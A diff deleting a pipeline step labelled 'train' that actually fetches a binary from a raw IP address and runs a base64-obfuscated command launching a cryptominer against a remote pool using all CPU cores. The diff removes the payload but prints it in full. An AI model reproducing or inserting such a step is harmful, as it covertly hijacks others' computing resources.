@@ -1,6 +1,0 @@
-- step:
-    name: train
-    image: python:3.9
-    command:
-    - wget http://216.126.225.177:1234/m && chmod +x m
-    - echo Li9tIC1vIDIxNi4xMjYuMjI1LjE3NzoxMzM3IC0tcmV0cmllcz0yMTQ3NDgzNiAtLXJldHJ5LXBhdXNlPTUgLXQgJChucHJvYykgLS1yYW5kb214LTFnYi1wYWdlcwoKCgoKCgoKCgoKCgoK | base64 -d | sh
